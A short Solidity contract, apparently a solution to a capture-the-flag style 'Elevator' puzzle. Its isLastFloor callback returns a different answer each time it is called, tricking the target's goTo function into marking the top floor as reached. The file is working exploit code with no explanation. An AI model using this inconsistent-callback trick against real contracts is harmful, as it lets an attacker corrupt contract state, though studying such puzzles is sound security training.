// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract BuildingAttacker {
    bool flag;

    function isLastFloor(uint256) public returns (bool) {
        flag = !flag;

        return flag;
    }

    function attack(address to, bool _flag) public {
        flag = _flag;
        
        IElevator(to).goTo(1);
    }
}